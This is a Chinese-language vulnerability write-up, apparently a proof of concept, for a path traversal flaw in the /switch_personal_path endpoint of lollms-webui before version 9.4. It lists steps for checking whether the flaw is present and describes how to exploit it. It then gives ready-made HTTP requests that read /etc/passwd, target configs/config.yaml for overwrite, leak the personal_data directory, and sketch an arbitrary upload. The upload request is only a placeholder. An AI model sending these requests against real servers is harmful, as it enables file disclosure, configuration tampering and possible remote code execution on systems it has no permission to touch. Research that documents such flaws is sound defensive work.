验证漏洞存在方法
    - 检查目标系统是否运行lollms-webui应用程序
    - 确认应用程序版本是否为9.4之前的版本
    - 尝试访问 `/switch_personal_path` 端点并观察响应
    - 测试路径遍历功能是否允许访问系统文件

漏洞利用方法
    - 该漏洞存在于lollms-webui应用程序的`/switch_personal_path`端点，由于对`path`参数的用户输入消毒不足，攻击者可以指定任意文件系统路径
    - 通过构造恶意的`path`参数，攻击者可以实现：
        1. 直接任意文件上传
        2. 泄露`personal_data`目录内容
        3. 覆盖`lollms-webui/configs`目录中的配置文件
    - 成功利用可导致敏感信息泄露、未经授权的文件上传，以及通过覆盖关键配置文件可能实现远程代码执行
    
PoC
    - 基础路径遍历测试：
      ```
      GET /switch_personal_path?path=../../../../etc/passwd HTTP/1.1
      Host: target.com
      ```
    
    - 配置文件覆盖攻击：
      ```
      GET /switch_personal_path?path=../../lollms-webui/configs/config.yaml HTTP/1.1
      Host: target.com
      ```
      
    - 个人数据泄露：
      ```
      GET /switch_personal_path?path=../personal_data/ HTTP/1.1
      Host: target.com
      ```
      
    - 任意文件上传（结合其他上传功能）：
      ```
      POST /upload_endpoint HTTP/1.1
      Host: target.com
      Content-Type: multipart/form-data
      
      -- 通过路径遍历指定上传位置 --
      ```

注意：实际利用可能需要结合其他功能端点，具体利用方式取决于目标系统的配置和可访问的功能模块。
